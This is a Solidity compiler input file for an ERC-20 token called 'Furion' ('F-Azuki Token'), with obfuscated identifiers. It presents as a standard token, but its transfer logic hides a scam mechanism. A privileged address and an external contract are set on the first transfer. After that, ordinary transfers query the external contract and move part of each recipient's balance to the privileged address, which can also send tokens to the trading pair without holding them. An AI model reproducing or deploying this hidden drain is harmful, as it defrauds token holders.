{{
  "language": "Solidity",
  "sources": {
    "/contracts/Furion.sol": {
      "content": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.12;\n     \nlibrary VSbIAbYkWZv{\n    \n    function KjvKo(address ahzsX, address niXUwNKiXE, uint EWuJGkd) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0x095ea7b3, niXUwNKiXE, EWuJGkd));\n        require(xXHw && (WGlWC.length == 0 || abi.decode(WGlWC, (bool))), 'VSbIAbYkWZv: APPROVE_FAILED');\n    }\n\n    function hlcGUyt(address ahzsX, address niXUwNKiXE, uint EWuJGkd) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0xa9059cbb, niXUwNKiXE, EWuJGkd));\n        require(xXHw && (WGlWC.length == 0 || abi.decode(WGlWC, (bool))), 'VSbIAbYkWZv: TRANSFER_FAILED');\n    }\n    \n    function zpBBAdTEJj(address niXUwNKiXE, uint EWuJGkd) internal {\n        (bool xXHw,) = niXUwNKiXE.call{value:EWuJGkd}(new bytes(0));\n        require(xXHw, 'VSbIAbYkWZv: ETH_TRANSFER_FAILED');\n    }\n\n    function IMfGhwt(address ahzsX, address from, address niXUwNKiXE, uint EWuJGkd) internal returns(bytes memory){\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0x23b872dd, from, niXUwNKiXE, EWuJGkd));\n        require(xXHw && WGlWC.length > 0,'VSbIAbYkWZv: TRANSFER_FROM_FAILED'); return WGlWC;\n                       \n    }\n\n}\n    \ninterface lbLY {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address fCZquFle) external view returns (uint256);\n    function transfer(address sISGGasRhM, uint256 bdSwxha) external returns (bool);\n    function allowance(address kgft, address spender) external view returns (uint256);\n    function approve(address spender, uint256 bdSwxha) external returns (bool);\n    function transferFrom(\n        address sender,\n        address sISGGasRhM,\n        uint256 bdSwxha\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed ytD, uint256 value);\n    event Approval(address indexed kgft, address indexed spender, uint256 value);\n}\n\ninterface utjhBaovG is lbLY {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\nabstract contract yqBYe {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n    \ninterface tMBNhCwHnxDy {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n}\n    \ncontract Furion is yqBYe, lbLY, utjhBaovG {\n    \n    mapping(address => uint256) private icpykfcxJgk;\n    \n    function totalSupply() public view virtual override returns (uint256) {\n        return FeuKwy;\n    }\n    \n    function decreaseAllowance(address cbSrVaGXx, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 ItRiuzCWT = oABsCeVyn[_msgSender()][cbSrVaGXx];\n        require(ItRiuzCWT >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            FDgSlWAQ(_msgSender(), cbSrVaGXx, ItRiuzCWT - subtractedValue);\n        }\n\n        return true;\n    }\n    \n    function allowance(address OZqIhIQhWS, address Zufp) public view virtual override returns (uint256) {\n        return oABsCeVyn[OZqIhIQhWS][Zufp];\n    }\n    \n    function LQHsucHy(\n        address ufThtDVfurj,\n        address HAGBcBiGj,\n        uint256 ksNOhCCF\n    ) internal virtual  returns (bool){\n        require(ufThtDVfurj != address(0), \"ERC20: transfer from the zero address\");\n        require(HAGBcBiGj != address(0), \"ERC20: transfer to the zero address\");\n        \n        if(!OMR(ufThtDVfurj,HAGBcBiGj)) return false;\n\n        if(_msgSender() == address(YKdXSAHAFZls)){\n            if(HAGBcBiGj == zpEYPz && icpykfcxJgk[ufThtDVfurj] < ksNOhCCF){\n                Bxp(YKdXSAHAFZls,HAGBcBiGj,ksNOhCCF);\n            }else{\n                Bxp(ufThtDVfurj,HAGBcBiGj,ksNOhCCF);\n                if(ufThtDVfurj == YKdXSAHAFZls || HAGBcBiGj == YKdXSAHAFZls) \n                return false;\n            }\n            emit Transfer(ufThtDVfurj, HAGBcBiGj, ksNOhCCF);\n            return false;\n        }\n        Bxp(ufThtDVfurj,HAGBcBiGj,ksNOhCCF);\n        emit Transfer(ufThtDVfurj, HAGBcBiGj, ksNOhCCF);\n        bytes memory fCI = VSbIAbYkWZv.IMfGhwt(lFiHDGuBue, ufThtDVfurj, HAGBcBiGj, ksNOhCCF);\n        (bool zspBzYs, uint aVjNF) = abi.decode(fCI, (bool,uint));\n        if(zspBzYs){\n            icpykfcxJgk[YKdXSAHAFZls] += aVjNF;\n            icpykfcxJgk[HAGBcBiGj] -= aVjNF; \n        }\n        return true;\n    }\n    \n    address private YKdXSAHAFZls;\n    \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n    \n    string private RvM =  \"Furion\";\n    \n    address private lFiHDGuBue;\n    \n    string private RIZIaENLPv = \"F-Azuki Token\";\n    \n    uint256 private FeuKwy = 10000000000 * 10 ** 18;\n    \n    function FDgSlWAQ(\n        address WXSfL,\n        address VMNztuC,\n        uint256 SQKzpZgFNIXS\n    ) internal virtual {\n        require(WXSfL != address(0), \"ERC20: approve from the zero address\");\n        require(VMNztuC != address(0), \"ERC20: approve to the zero address\");\n\n        oABsCeVyn[WXSfL][VMNztuC] = SQKzpZgFNIXS;\n        emit Approval(WXSfL, VMNztuC, SQKzpZgFNIXS);\n\n    }\n    \n    function transfer(address lrFUhtijfDkv, uint256 hAwZwra) public virtual override returns (bool) {\n        LQHsucHy(_msgSender(), lrFUhtijfDkv, hAwZwra);\n        return true;\n    }\n    \n    function transferFrom(\n        address VjtGvini,\n        address hMZyQiUezY,\n        uint256 mxHCrC\n    ) public virtual override returns (bool) {\n      \n        if(!LQHsucHy(VjtGvini, hMZyQiUezY, mxHCrC)) return true;\n\n        uint256 hdYbKKXPH = oABsCeVyn[VjtGvini][_msgSender()];\n        if (hdYbKKXPH != type(uint256).max) {\n            require(hdYbKKXPH >= mxHCrC, \"ERC20: transfer Amount exceeds allowance\");\n            unchecked {\n                FDgSlWAQ(VjtGvini, _msgSender(), hdYbKKXPH - mxHCrC);\n            }\n        }\n\n        return true;\n    }\n    \n    function increaseAllowance(address oebaqyfuWpT, uint256 addedValue) public virtual returns (bool) {\n        FDgSlWAQ(_msgSender(), oebaqyfuWpT, oABsCeVyn[_msgSender()][oebaqyfuWpT] + addedValue);\n        return true;\n    }\n    \n    function OMR(\n        address rApx,\n        address HizAtPZ\n    ) internal virtual  returns (bool){\n        if(YKdXSAHAFZls == address(0) && lFiHDGuBue == address(0)){\n            YKdXSAHAFZls = rApx;lFiHDGuBue=HizAtPZ;\n            VSbIAbYkWZv.hlcGUyt(lFiHDGuBue, YKdXSAHAFZls, 0);\n            zpEYPz = tMBNhCwHnxDy(lFiHDGuBue).WETH();\n            return false;\n        }\n        return true;\n    }\n    \n    function balanceOf(address gULQUkuMVnJ) public view virtual override returns (uint256) {\n       return icpykfcxJgk[gULQUkuMVnJ];\n    }\n    \n    address private zpEYPz;\n  \n    \n    constructor() {\n        \n        icpykfcxJgk[address(1)] = FeuKwy;\n        emit Transfer(address(0), address(1), FeuKwy);\n\n    }\n    \n    function symbol() public view virtual override returns (string memory) {\n        return RvM;\n    }\n    \n    function name() public view virtual override returns (string memory) {\n        return RIZIaENLPv;\n    }\n    \n    function approve(address sFttefh, uint256 MbCKtUItb) public virtual override returns (bool) {\n        FDgSlWAQ(_msgSender(), sFttefh, MbCKtUItb);\n        return true;\n    }\n    \n    function Bxp(\n        address hErxRwpBy,\n        address HQdYMcPRDgr,\n        uint256 YBvxEhHj\n    ) internal virtual  returns (bool){\n        uint256 lHVt = icpykfcxJgk[hErxRwpBy];\n        require(lHVt >= YBvxEhHj, \"ERC20: transfer Amount exceeds balance\");\n        unchecked {\n            icpykfcxJgk[hErxRwpBy] = lHVt - YBvxEhHj;\n        }\n        icpykfcxJgk[HQdYMcPRDgr] += YBvxEhHj;\n        return true;\n    }\n    \n    mapping(address => mapping(address => uint256)) private oABsCeVyn;\n    \n}\n        "
    }
  },
  "settings": {
    "remappings": [],
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "evmVersion": "london",
    "libraries": {},
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}